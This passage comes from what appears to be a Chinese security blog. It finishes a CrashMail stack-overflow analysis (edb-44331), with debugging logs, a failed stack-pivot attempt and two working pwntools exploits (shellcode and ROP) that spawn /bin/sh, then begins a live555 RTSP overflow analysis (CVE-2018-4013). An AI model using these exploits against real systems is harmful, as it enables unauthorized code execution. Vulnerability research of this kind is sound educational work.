<p>我们可以用xchg指令把esi的值交换到eax中，再跳到 0x80649CF gadget处执行，那么/bin/sh字符串地址就可以被压栈。此种情况下栈布局为：</p>

<p><img src="/assets/posts/2025-04-17-Crashmail 栈溢出漏洞分析/crashmail-rop.jpg" alt="crashmail-rop.jpg" /></p>

<h2 id="x64下的调试">x64下的调试</h2>

<p>x64下buf到栈上面保存的rbp的距离为0xd0，到返回地址的距离为0xd8</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.text 00000000004038E6 <span class="p">;</span> bool __cdecl LockConfig<span class="o">(</span>char <span class="k">*</span>file<span class="o">)</span>
.text:00000000004038E6                 public LockConfig
.text:00000000004038E6 LockConfig      proc near               <span class="p">;</span> CODE XREF: main+1CB↓p
.text:00000000004038E6                                         <span class="p">;</span> main+24B↓p
.text:00000000004038E6
.text:00000000004038E6 file            <span class="o">=</span> qword ptr <span class="nt">-0D8h</span>
.text:00000000004038E6 buf             <span class="o">=</span> byte ptr <span class="nt">-0D0h</span>
.text:00000000004038E6 fp              <span class="o">=</span> qword ptr <span class="nt">-8</span>
.text:00000000004038E6
.text:00000000004038E6 <span class="p">;</span> __unwind <span class="o">{</span>
.text:00000000004038E6                 endbr64
.text:00000000004038EA                 push    rbp
.text:00000000004038EB                 mov     rbp, rsp
.text:00000000004038EE                 sub     rsp, 0E0h
.text:00000000004038F5                 mov     <span class="o">[</span>rbp+file], rdi
.text:00000000004038FC                 mov     rdx, <span class="o">[</span>rbp+file]
.text:0000000000403903                 lea     rax, <span class="o">[</span>rbp+buf]
.text:000000000040390A                 mov     rsi, rdx        <span class="p">;</span> src
.text:000000000040390D                 mov     rdi, rax        <span class="p">;</span> dest
.text:0000000000403910                 call    _strcpy
.text:0000000000403915                 lea     rax, <span class="o">[</span>rbp+buf]
</code></pre></div></div>

<p>把断点下在0x4039EE，LockConfig函数ret之前：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.text:00000000004039DC loc_4039DC:                             <span class="p">;</span> CODE XREF: LockConfig+D2↑j
.text:00000000004039DC                 mov     rax, <span class="o">[</span>rbp+fp]
.text:00000000004039E0                 mov     rdi, rax        <span class="p">;</span> os
.text:00000000004039E3                 call    osClose
.text:00000000004039E8                 mov     eax, 1
.text:00000000004039ED
.text:00000000004039ED locret_4039ED:                          <span class="p">;</span> CODE XREF: LockConfig+A0↑j
.text:00000000004039ED                                         <span class="p">;</span> LockConfig+F4↑j
.text:00000000004039ED                 leave
.text:00000000004039EE                 retn
.text:00000000004039EE <span class="p">;</span> <span class="o">}</span> // starts at 4038E6
.text:00000000004039EE LockConfig      endp
</code></pre></div></div>

<p>buf数组位于0x7ffe8bd42aa0 ，寄存器里除了rsp之外还有r13指向栈地址，但是r13指向的位置比rsp指针指向的位置高。由于存在NULL截断，所以就写不到这个位置。</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Breakpoint 1, 0x00000000004039ee <span class="k">in </span>LockConfig <span class="o">(</span><span class="nv">file</span><span class="o">=</span>0x7ffe8bd44797 <span class="s1">'\220'</span> &lt;repeats 200 <span class="nb">times</span><span class="o">&gt;</span>...<span class="o">)</span>     │test@0c3259477029:/test<span class="nv">$ </span>
    at crashmail/crashmail.c:505                                                                       │test@0c3259477029:/test<span class="nv">$ </span>
505     <span class="o">}</span>                                                                                              │test@0c3259477029:/test<span class="nv">$ </span><span class="nb">ls</span>                                                  │p_x64.py
<span class="o">(</span>gdb<span class="o">)</span> info reg                                                                                         │test@0c3259477029:/test<span class="nv">$ </span>./exp_x64.py 
rax            0x1                 1                                                                   │[+] Starting <span class="nb">local </span>process <span class="s1">'/usr/bin/gdbserver'</span>: pid 1212
rbx            0x42f950            4389200                                                             │[<span class="k">*</span><span class="o">]</span> running <span class="k">in </span>new terminal: <span class="o">[</span><span class="s1">'/usr/bin/gdb'</span>, <span class="s1">'-q'</span>, <span class="s1">'/test/crashmail-1.6/bin/crashmail'</span>, <span class="s1">'-x'</span>, <span class="s1">'/tmp/p
rcx            0x1                 1                                                                   │wnlib-gdbscript-m6dywxad.gdb'</span><span class="o">]</span>
rdx            0x0                 0                                                                   │[<span class="k">*</span><span class="o">]</span> Paused <span class="o">(</span>press any to <span class="k">continue</span><span class="o">)</span>
rsi            0x17e372a0          400781984                                                           │
rdi            0x17e37048          400781384                                                           │
rbp            0x9090909090909090  0x9090909090909090                                                  │
rsp            0x7ffe8bd42b78      0x7ffe8bd42b78                                                      │
r8             0x0                 0                                                                   │
r9             0x1                 1                                                                   │
r10            0x400b93            4197267                                                             │
r11            0x202               514                                                                 │
r12            0x402910            4204816                                                             │
r13            0x7ffe8bd42e90      140731244359312                                                     │
r14            0x0                 0                                                                   │
r15            0x0                 0                                                                   │
rip            0x4039ee            0x4039ee &lt;LockConfig+264&gt;                                           │
eflags         0x206               <span class="o">[</span> PF IF <span class="o">]</span>                                                           │
cs             0x33                51                                                                  │
ss             0x2b                43                                                                  │
ds             0x0                 0                                                                   │
es             0x0                 0                                                                   │
fs             0x0                 0                                                                   │
gs             0x0                 0                                                                   │
<span class="o">(</span>gdb<span class="o">)</span> p &amp;buf                                                                                           │
<span class="nv">$1</span> <span class="o">=</span> <span class="o">(</span>char <span class="o">(</span><span class="k">*</span><span class="o">)[</span>200]<span class="o">)</span> 0x7ffe8bd42aa0                                       
</code></pre></div></div>

<h3 id="栈劫持尝试">栈劫持尝试</h3>

<p>这种情况下我们尝试把栈劫持到buf[200]数组的范围内。</p>

<p>根据事实，x64程序的返回通常使用”leave ret“，以osExecute为例：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.text:000000000042F656 osExists        proc near               <span class="p">;</span> CODE XREF: LockConfig+AC↑p
.text:000000000042F656                 endbr64
.text:000000000042F65A                 push    rbp
.text:000000000042F65B                 mov     rbp, rsp
.text:000000000042F65E                 sub     rsp, 0A0h
.text:000000000042F665                 mov     <span class="o">[</span>rbp+file], rdi
.text:000000000042F66C                 lea     rdx, <span class="o">[</span>rbp+st]
.text:000000000042F673                 mov     rax, <span class="o">[</span>rbp+file]
.text:000000000042F67A                 mov     rsi, rdx        <span class="p">;</span> stat_buf
.text:000000000042F67D                 mov     rdi, rax        <span class="p">;</span> filename
.text:000000000042F680                 call    stat_0
.text:000000000042F685                 <span class="nb">test    </span>eax, eax
.text:000000000042F687                 jnz     short loc_42F690
.text:000000000042F689                 mov     eax, 1
.text:000000000042F68E                 jmp     short locret_42F695
.text:000000000042F690 loc_42F690:                             <span class="p">;</span> CODE XREF: osExists+31↑j
.text:000000000042F690                 mov     eax, 0
.text:000000000042F695
.text:000000000042F695 locret_42F695:                          <span class="p">;</span> CODE XREF: osExists+38↑j
.text:000000000042F695                 leave
.text:000000000042F696                 retn
.text:000000000042F696 osExists        endp
</code></pre></div></div>

<p>其中leave用于平衡栈，相当于指令：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mov rsp, rbp     <span class="p">;</span> 恢复rsp
pop rbp          <span class="p">;</span> 恢复父函数的rbp
</code></pre></div></div>

<p>当前函数返回的时候先用rbp寄存器恢复rsp指向save rbp，再从栈里面恢复父函数的rbp寄存器。</p>

<p>同理，当父函数返回的时候，同样也会调用leave指令，用rbp寄存器来恢复rsp，</p>

<p>而父函数使用的rbp寄存器，则由于子函数的栈溢出而被攻击者控制。</p>

<p>因此只要把栈上面保存的rbp覆盖为我们想要的值，那么当父函数返回的时候就会发生栈劫持。</p>

<p>攻击者可以在fake stack上面布置rop链，或者进行ret2shellcode攻击。</p>

<p><img src="/assets/posts/2025-04-17-Crashmail 栈溢出漏洞分析/crashmail-%E5%8A%AB%E6%8C%81rsp.jpg" alt="crashmail-劫持rsp.jpg" /></p>

<p><img src="/assets/posts/2025-04-17-Crashmail 栈溢出漏洞分析/crashmail-%E5%8A%AB%E6%8C%81rsp%201.jpg" alt="crashmail-劫持rsp.jpg" /></p>

<p>很不幸的是这个思路无法完成，存在以下4个无法解决的问题：</p>

<ul>
  <li>LockConfig函数的父函数是main，但是LockConfig返回到main函数后，main函数并不会马上结束，而是继续调用了其他函数，这就会导致我们在buf[200]上面布置好的jmp esp指令和shellcode会被破坏掉。因为我们只能控制栈上面的内容，但凡是可以往其他段上面写东西，就不存在这个问题了；</li>
  <li>通过NULL字节覆盖saved rbp的最低字节为0，还是没办法让rbp落在buf[200]数组中，因为main函数分配的栈空间很大，超过了0xFF，所以覆盖下来rbp还是指向main函数的栈空间；</li>
  <li>即使我们能够成功让rbp指向buf[200]数组，这也是随机事件，存在概率性，不可能每次都成功；</li>
  <li>当然最重要的，也无法解决的就是，即使我们把栈劫持到了buf[200]数组，我们还要提前把fake stack布置好吧，
    <ul>
      <li>如果是ret2shellcode，那么就要往里面模拟出fake rbp和“jmp esp”指令的地址。fake rbp好搞定，写0xdeadbeefdeadbeef就行了。指令地址就不行了，因为里面有\x00。</li>
      <li>如果是rop，那更完蛋，因为rop里面全是地址，完全写不了！</li>
    </ul>
  </li>
</ul>

<p>所以综上，栈劫持的思路也搞不定。</p>

<p>最后附上这次调试记录：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># 第一次断在LockConfig函数的ret指令的位置, 查看buf[200]数组的地址为 0x7ffda2738a00 </span>
<span class="c"># 此时rbp寄存器已经被恢复为main函数的栈帧了</span>
<span class="c"># 到这个断点的时候，exp调试脚本已经把rbp寄存器手工设置为buf地址</span>
<span class="c"># 并且LockConfig的返回地址也修改为直接返回到main函数的leave ret指令处，不再调用其他函数直接退出</span>
<span class="c"># 在main函数的ret指令处下断点，观察栈劫持是否成功</span>

Reading /lib64/ld-linux-x86-64.so.2 from remote target...                                       │[<span class="k">*</span><span class="o">]</span> Process <span class="s1">'/usr/bin/gdbserver'</span> stopped with <span class="nb">exit </span>code 0 <span class="o">(</span>pid 1261<span class="o">)</span>
0x00007fd8d2981100 <span class="k">in </span>_start <span class="o">()</span> from target:/lib64/ld-linux-x86-64.so.2                         │test@0c3259477029:/test<span class="nv">$ </span>
Breakpoint 1 at 0x4039ee: file crashmail/crashmail.c, line 505.                                 │test@0c3259477029:/test<span class="nv">$ </span>
Reading /lib/x86_64-linux-gnu/libc.so.6 from remote target...                                   │test@0c3259477029:/test<span class="nv">$ </span>
                                                                                                │test@0c3259477029:/test<span class="nv">$ </span>./exp_x64.py 
Breakpoint 1, 0x00000000004039ee <span class="k">in </span>LockConfig <span class="o">(</span>                                                │[+] Starting <span class="nb">local </span>process <span class="s1">'/usr/bin/gdbserver'</span>: pid 1271
    <span class="nv">file</span><span class="o">=</span>0x7ffda273a7ad <span class="s1">'\220'</span> &lt;repeats 200 <span class="nb">times</span><span class="o">&gt;</span>...<span class="o">)</span> at crashmail/crashmail.c:505             │[<span class="k">*</span><span class="o">]</span> running <span class="k">in </span>new terminal: <span class="o">[</span><span class="s1">'/usr/bin/gdb'</span>, <span class="s1">'-q'</span>, <span class="s1">'/test/crashmail-1.6/bin/crashmail'</span>, <span class="s1">'-x'</span>, 
505     <span class="o">}</span>                                                                                       │<span class="s1">'/tmp/pwnlib-gdbscript-r447ypjw.gdb'</span><span class="o">]</span>
<span class="nv">$1</span> <span class="o">=</span> <span class="o">(</span>char <span class="o">(</span><span class="k">*</span><span class="o">)[</span>200]<span class="o">)</span> 0x7ffda2738a00                                                             │[<span class="k">*</span><span class="o">]</span> Paused <span class="o">(</span>press any to <span class="k">continue</span><span class="o">)</span>
Breakpoint 2 at 0x404188: file crashmail/crashmail.c, line 720.                                 │[<span class="k">*</span><span class="o">]</span> Process <span class="s1">'/usr/bin/gdbserver'</span> stopped with <span class="nb">exit </span>code 0 <span class="o">(</span>pid 1275<span class="o">)</span>
<span class="o">(</span>gdb<span class="o">)</span> p/x <span class="nv">$rbp</span>                                                                                  │test@0c3259477029:/test<span class="nv">$ </span>
<span class="nv">$2</span> <span class="o">=</span> 0x7ffda2738a00    

<span class="c"># 继续运行，在main函数的ret指令处断下</span>
<span class="c"># 观察此时rsp的值为0x7ffda2738a08，已经位于buf数组中</span>
<span class="c"># 证明可以使用leave ret进行栈劫持                                                                </span>
<span class="o">(</span>gdb<span class="o">)</span> c                                                                                         │test@0c3259477029:/test<span class="nv">$ </span>
Continuing.                                                                                     │test@0c3259477029:/test<span class="nv">$ </span>
                                                                                        │test@0c3259477029:/test<span class="nv">$ </span><span class="nb">ls
</span>Breakpoint 2, 0x0000000000404188 <span class="k">in </span>main <span class="o">(</span><span class="nv">argc</span><span class="o">=</span>32728, <span class="nv">argv</span><span class="o">=</span>0x0<span class="o">)</span> at crashmail/crashmail.c:720    │ bin
720     <span class="o">}</span>                                                                                       │ container_start.sh
<span class="o">(</span>gdb<span class="o">)</span> p/x <span class="nv">$rsp</span>                                                                                  │ crashmail-1.6
<span class="nv">$3</span> <span class="o">=</span> 0x7ffda2738a08                                                                             │ crashmail-1.6.tar.gz
<span class="o">(</span>gdb<span class="o">)</span>                    

</code></pre></div></div>

<p>附上调试exp：</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python
</span>
<span class="c1"># shellcode版本
</span><span class="kn">from</span> <span class="n">subprocess</span> <span class="kn">import</span> <span class="n">run</span>
<span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="sh">'</span><span class="s">amd64</span><span class="sh">'</span>
<span class="n">context</span><span class="p">.</span><span class="n">os</span> <span class="o">=</span> <span class="sh">'</span><span class="s">linux</span><span class="sh">'</span>
<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="sh">'</span><span class="s">tmux</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">splitw</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">-hb</span><span class="sh">'</span><span class="p">]</span>

<span class="n">offset</span> <span class="o">=</span> <span class="mh">0xd0</span>
<span class="n">offset</span> <span class="o">-=</span> <span class="nf">len</span><span class="p">(</span><span class="sh">'</span><span class="s">.busy</span><span class="sh">'</span><span class="p">)</span>
<span class="n">offset</span> <span class="o">-=</span> <span class="mi">1</span>

<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x90</span><span class="sh">'</span> <span class="o">*</span> <span class="n">offset</span>
<span class="n">script</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">
    b *0x4039EE
    c
    p &amp;buf
    set $rbp=$1
    set *(unsigned long*)$rsp=0x404187
    b *0x404188
</span><span class="sh">'''</span>

<span class="c1"># run(["/test/crashmail-1.6/bin/crashmail", "SETTINGS", payload])
</span><span class="n">gdb</span><span class="p">.</span><span class="nf">debug</span><span class="p">(</span><span class="n">args</span><span class="o">=</span><span class="p">[</span><span class="sh">"</span><span class="s">/test/crashmail-1.6/bin/crashmail</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">LOCK</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">SETTINGS</span><span class="sh">"</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="sh">"</span><span class="s">UNLOCK</span><span class="sh">"</span><span class="p">],</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">script</span><span class="p">,</span> <span class="n">exe</span><span class="o">=</span><span class="sh">"</span><span class="s">/test/crashmail-1.6/bin/crashmail</span><span class="sh">"</span><span class="p">)</span>
<span class="nf">pause</span><span class="p">()</span>
</code></pre></div></div>

<h1 id="漏洞利用">漏洞利用</h1>

<h2 id="shellcode版本">shellcode版本</h2>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python
</span>
<span class="c1"># shellcode版本
</span><span class="kn">from</span> <span class="n">subprocess</span> <span class="kn">import</span> <span class="n">run</span>
<span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="sh">'</span><span class="s">i386</span><span class="sh">'</span>
<span class="n">context</span><span class="p">.</span><span class="n">os</span> <span class="o">=</span> <span class="sh">'</span><span class="s">linux</span><span class="sh">'</span>
<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="sh">'</span><span class="s">tmux</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">splitw</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">-hb</span><span class="sh">'</span><span class="p">]</span>

<span class="n">offset</span> <span class="o">=</span> <span class="mh">0xd8</span>       <span class="c1"># buf数组到栈上面保存rbp的距离
</span><span class="n">xchg_eax_esi_ret</span> <span class="o">=</span> <span class="mh">0x80674ab</span>
<span class="n">jmp_eax</span> <span class="o">=</span> <span class="mh">0x8051807</span>

<span class="n">shellcode</span> <span class="o">=</span> <span class="nf">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="nf">sh</span><span class="p">())</span>

<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x90</span><span class="sh">'</span> <span class="o">*</span> <span class="n">offset</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="n">xchg_eax_esi_ret</span><span class="p">)</span> <span class="o">+</span> \
            <span class="nf">p32</span><span class="p">(</span><span class="n">jmp_eax</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x90</span><span class="sh">'</span> <span class="o">*</span> <span class="mh">0x300</span> <span class="o">+</span> <span class="n">shellcode</span>

<span class="nf">run</span><span class="p">([</span><span class="sh">"</span><span class="s">/test/crashmail-1.6/bin/crashmail</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">SETTINGS</span><span class="sh">"</span><span class="p">,</span> <span class="n">payload</span><span class="p">])</span>
</code></pre></div></div>

<p><img src="/assets/posts/2025-04-17-Crashmail 栈溢出漏洞分析/1.png" alt="1.png" /></p>

<h2 id="rop版本">rop版本</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/python</span>

<span class="c"># rop版本</span>
from subprocess import run
from pwn import <span class="k">*</span>

context.arch <span class="o">=</span> <span class="s1">'i386'</span>
context.os <span class="o">=</span> <span class="s1">'linux'</span>
context.terminal <span class="o">=</span> <span class="o">[</span><span class="s1">'tmux'</span>, <span class="s1">'splitw'</span>, <span class="s1">'-hb'</span><span class="o">]</span>

offset <span class="o">=</span> 0xd8       <span class="c"># buf数组到栈上面保存rbp的距离</span>
xchg_eax_esi_ret <span class="o">=</span> 0x80674ab
osExecute <span class="o">=</span> 0x80649CF     <span class="c"># push    eax; call    osExecute</span>

rw_seg <span class="o">=</span> 0x807d010

payload <span class="o">=</span> b<span class="s1">'\x90'</span> <span class="k">*</span> offset + p32<span class="o">(</span>xchg_eax_esi_ret<span class="o">)</span> + p32<span class="o">(</span>osExecute<span class="o">)</span> + <span class="se">\</span>
					b<span class="s1">'\x90'</span> <span class="k">*</span> 0x24c + b<span class="s1">'//bin/sh #'</span>

run<span class="o">([</span><span class="s2">"/test/crashmail-1.6/bin/crashmail"</span>, <span class="s2">"SETTINGS"</span>, payload]<span class="o">)</span>
</code></pre></div></div>

<p><img src="/assets/posts/2025-04-17-Crashmail 栈溢出漏洞分析/%E6%89%B9%E6%B3%A8_2025-04-17_154222.png" alt="批注 2025-04-17 154222.png" /></p>]]></content><author><name></name></author><category term="userspace" /><summary type="html"><![CDATA[CrashMail 是一款早期的开源 DOS 系统下的 BBS 邮件处理工具。 漏洞编号：edb-44331 利用环境：ubuntu 20.04，源代码32位编译]]></summary></entry><entry><title type="html">live555栈溢出漏洞分析</title><link href="http://localhost:4000/userspace/2025/04/15/live555-%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html" rel="alternate" type="text/html" title="live555栈溢出漏洞分析" /><published>2025-04-15T13:27:38+08:00</published><updated>2025-04-15T13:27:38+08:00</updated><id>http://localhost:4000/userspace/2025/04/15/live555-%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90</id><content type="html" xml:base="http://localhost:4000/userspace/2025/04/15/live555-%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html"><![CDATA[<p>Live555 是一个开源的、跨平台的 C++ 库，主要用于实现 <strong>RTSP/RTP/RTCP</strong> 等流媒体协议的推流（Server）和拉流（Client）功能。它支持多种音视频格式（如 H.264、H.265、MP3、AAC 等），常用于 IP 摄像头、视频监控、直播等场景。</p>

<h1 id="漏洞信息">漏洞信息</h1>

<p>Live555 是一个开源的、跨平台的 C++ 库，主要用于实现 <strong>RTSP/RTP/RTCP</strong> 等流媒体协议的推流（Server）和拉流（Client）功能。它支持多种音视频格式（如 H.264、H.265、MP3、AAC 等），常用于 IP 摄像头、视频监控、直播等场景。</p>

<p>漏洞编号：cve-2018-4013</p>

<p>效果：攻击者可以获取远程shell</p>

<p>内存控制能力：</p>

<ul>
  <li>没有NULL截断，可随意写入</li>
  <li>栈上面的内容可控，无任何添加</li>
  <li>溢出长度可控</li>
  <li>没有内容过滤</li>
</ul>

<h1 id="漏洞分析">漏洞分析</h1>

<h2 id="调用关系">调用关系</h2>

<p><img src="/assets/posts/2025-04-15-live555栈溢出漏洞分析/live555.jpg" alt="live555.jpg" /></p>

<h2 id="漏洞原理">漏洞原理</h2>

<p>doEventLoop是处理网络输入的主逻辑，它是TaskScheduler对象的方法：</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">**</span> <span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
  
  <span class="n">TaskScheduler</span><span class="o">*</span> <span class="n">scheduler</span> <span class="o">=</span> <span class="n">BasicTaskScheduler</span><span class="o">::</span><span class="n">createNew</span><span class="p">();</span>
  <span class="n">UsageEnvironment</span><span class="o">*</span> <span class="n">env</span> <span class="o">=</span> <span class="n">BasicUsageEnvironment</span><span class="o">::</span><span class="n">createNew</span><span class="p">(</span><span class="o">*</span><span class="n">scheduler</span><span class="p">);</span>
  <span class="p">......</span>
  <span class="n">env</span><span class="o">-&gt;</span><span class="n">taskScheduler</span><span class="p">().</span><span class="n">doEventLoop</span><span class="p">();</span> <span class="c1">// does not return</span>
<span class="p">}</span>
</code></pre></div></div>

<p>handleRequestBytes解析http请求的头部，把cookie部分保存在sessionCookie数组，accept部分保存在acceptStr数组中，两个数组长度都是200字节，其中acceptStr数组是溢出对象。</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="n">RTSPServer</span><span class="o">::</span><span class="n">RTSPClientConnection</span><span class="o">::</span><span class="n">handleRequestBytes</span><span class="p">(</span><span class="kt">int</span> <span class="n">newBytesRead</span><span class="p">)</span> <span class="p">{</span>
	<span class="p">......</span>
	<span class="kt">char</span> <span class="n">sessionCookie</span><span class="p">[</span><span class="mi">200</span><span class="p">];</span>
  <span class="kt">char</span> <span class="n">acceptStr</span><span class="p">[</span><span class="mi">200</span><span class="p">];</span>     <span class="c1">//溢出对象</span>
  <span class="o">*</span><span class="n">fLastCRLF</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span> 
  <span class="n">parseSucceeded</span> <span class="o">=</span> <span class="n">parseHTTPRequestString</span><span class="p">(</span><span class="n">cmdName</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">cmdName</span><span class="p">,</span>
					      <span class="n">urlSuffix</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">urlPreSuffix</span><span class="p">,</span>
					      <span class="n">sessionCookie</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">sessionCookie</span><span class="p">,</span>
					      <span class="n">acceptStr</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">acceptStr</span><span class="p">);</span>
	<span class="p">......</span>
<span class="p">}</span>
</code></pre></div></div>

<p>可以看到acceptStr数组到返回地址的距离是0x1c8，因为这里的栈变量是以rsp+0x6D8来索引的，也就是用的到返回地址的距离：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.text:0000000000407EE0 _ZN10RTSPServer20RTSPClientConnection18handleRequestBytesEi proc near
.text:0000000000407EE0                                         <span class="p">;</span> DATA XREF: .data.rel.ro:0000000000464F68↓o
.text:0000000000407EE0
.text:0000000000407EE0 var_6D8         <span class="o">=</span> qword ptr <span class="nt">-6D8h</span>
.text:0000000000407EE0 tmpPtr          <span class="o">=</span> qword ptr <span class="nt">-6D0h</span>
.text:0000000000407EE0 var_6C8         <span class="o">=</span> qword ptr <span class="nt">-6C8h</span>
.text:0000000000407EE0 newBytesRead    <span class="o">=</span> qword ptr <span class="nt">-6C0h</span>
.text:0000000000407EE0 reuseConnection <span class="o">=</span> byte ptr <span class="nt">-6ADh</span>
.text:0000000000407EE0 contentLength   <span class="o">=</span> dword ptr <span class="nt">-6ACh</span>
.text:0000000000407EE0 cmdName         <span class="o">=</span> byte ptr <span class="nt">-6A8h</span>
.text:0000000000407EE0 urlPreSuffix    <span class="o">=</span> byte ptr <span class="nt">-5D8h</span>
.text:0000000000407EE0 urlSuffix       <span class="o">=</span> byte ptr <span class="nt">-508h</span>
.text:0000000000407EE0 cseq            <span class="o">=</span> byte ptr <span class="nt">-438h</span>
.text:0000000000407EE0 sessionIdStr    <span class="o">=</span> byte ptr <span class="nt">-368h</span>
.text:0000000000407EE0 sessionCookie   <span class="o">=</span> byte ptr <span class="nt">-298h</span>
.text:0000000000407EE0 acceptStr       <span class="o">=</span> byte ptr <span class="nt">-1C8h</span>     <span class="p">;</span> 到返回地址的距离为0x1c8
.text:0000000000407EE0
.text:0000000000407EE0 this <span class="o">=</span> rdi                              <span class="p">;</span> RTSPServer::RTSPClientConnection <span class="k">*</span>const
.text:0000000000407EE0 newBytesRead_0 <span class="o">=</span> rsi                    <span class="p">;</span> int
.text:0000000000407EE0 <span class="p">;</span> __unwind <span class="o">{</span>
.text:0000000000407EE0                 endbr64
.text:0000000000407EE4                 push    r15
.text:0000000000407EE6                 mov     r15, this
.text:0000000000407EE9                 push    r14
.text:0000000000407EEB                 push    r13
.text:0000000000407EED                 mov     r13d, esi
.text:0000000000407EF0                 push    r12
.text:0000000000407EF2                 push    rbp
.text:0000000000407EF3                 push    rbx
.text:0000000000407EF4                 sub     rsp, 6A8h
.text:0000000000407EFB                 add     dword ptr <span class="o">[</span>this+9C90h], 1
.text:0000000000407F02                 mov     r9d, <span class="o">[</span>this+9C68h]
.text:0000000000407F09                 <span class="nb">test    </span>esi, esi
.text:0000000000407F0B                 js      loc_4082C6
.text:0000000000407F11                 xor     eax, eax
.text:0000000000407F13 numBytesRemaining <span class="o">=</span> rax                 <span class="p">;</span> int
.text:0000000000407F13                 mov     r12d, r13d
.text:0000000000407F16                 cmp     r13d, r9d
.text:0000000000407F19                 jnb     loc_4082C6
.text:0000000000407F1F this <span class="o">=</span> r15                              <span class="p">;</span> RTSPServer::RTSPClientConnection <span class="k">*</span>const
.text:0000000000407F1F newBytesRead_0 <span class="o">=</span> r12                    <span class="p">;</span> int
.text:0000000000407F1F                 nop
.text:0000000000407F20
.text:0000000000407F20 loc_407F20:                             <span class="p">;</span> CODE XREF: RTSPServer::RTSPClientConnection::handleRequestBytes<span class="o">(</span>int<span class="o">)</span>+3E0↓j
.text:0000000000407F20                 mov     edx, <span class="o">[</span>this+9C64h]
.text:0000000000407F27                 lea     rbx, <span class="o">[</span>this+rdx+24h]
.text:0000000000407F2C ptr <span class="o">=</span> rbx                               <span class="p">;</span> unsigned __int8 <span class="k">*</span>
.text:0000000000407F2C                 movsxd  rdx, r13d
.text:0000000000407F2F                 mov     byte ptr <span class="o">[</span>ptr+rdx], 0
.text:0000000000407F33                 <span class="nb">test    </span>eax, eax
.text:0000000000407F35                 jz      loc_408318
.text:0000000000407F3B                 sub     rsp, 8
.text:0000000000407F3F                 mov     rdi, cs:stderr@@GLIBC_2_2_5
.text:0000000000407F46                 mov     r9d, r13d
.text:0000000000407F49                 xor     eax, eax
.text:0000000000407F4B                 push    ptr
.text:0000000000407F4C                 lea     rdx, aRtspclientconn <span class="p">;</span> <span class="s2">"RTSPClientConnection[%p]::handleRequest"</span>...
.text:0000000000407F53                 mov     rcx, this
.text:0000000000407F56                 mov     esi, 1
.text:0000000000407F5B                 lea     r8, aProcessing <span class="p">;</span> <span class="s2">"processing"</span>
.text:0000000000407F62                 call    ___fprintf_chk
.text:0000000000407F67                 mov     r9d, <span class="o">[</span>this+9CD8h]
.text:0000000000407F6E                 pop     rax
.text:0000000000407F6F                 pop     rdx
.text:0000000000407F70
.text:0000000000407F70 loc_407F70:                             <span class="p">;</span> CODE XREF: RTSPServer::RTSPClientConnection::handleRequestBytes<span class="o">(</span>int<span class="o">)</span>+482↓j
.text:0000000000407F70                                         <span class="p">;</span> RTSPServer::RTSPClientConnection::handleRequestBytes<span class="o">(</span>int<span class="o">)</span>+6B8↓j
.text:0000000000407F70                 <span class="nb">test    </span>r9d, r9d
.text:0000000000407F73                 jnz     short loc_407FE0
.text:0000000000407F75                 mov     rax, <span class="o">[</span>this+9C88h]
.text:0000000000407F7C                 lea     rbp, <span class="o">[</span>this+24h]
.text:0000000000407F80                 lea     r11, <span class="o">[</span>rax+2]
